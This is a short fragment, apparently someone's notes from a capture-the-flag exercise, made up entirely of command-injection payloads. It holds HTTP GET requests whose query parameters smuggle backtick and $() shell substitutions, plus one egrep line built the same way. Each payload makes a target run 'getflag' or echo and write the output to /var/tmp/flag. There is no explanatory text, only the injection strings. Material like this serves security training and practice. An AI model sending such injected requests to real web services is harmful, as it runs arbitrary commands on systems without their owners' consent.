GET /?x=$\($_[1]\)&y=echo+\(getflag\)

egrep "^`echo $(getflag) > /var/tmp/flag`" /tmp/xd 2>&1
GET /?x=$\($_[1]\)&y=`echo+$\(getflag\)+>+/var/tmp/flag`

GET /?x=\`\$\_\[1\]\`&y=\`echo+hello>/var/tmp/flag\`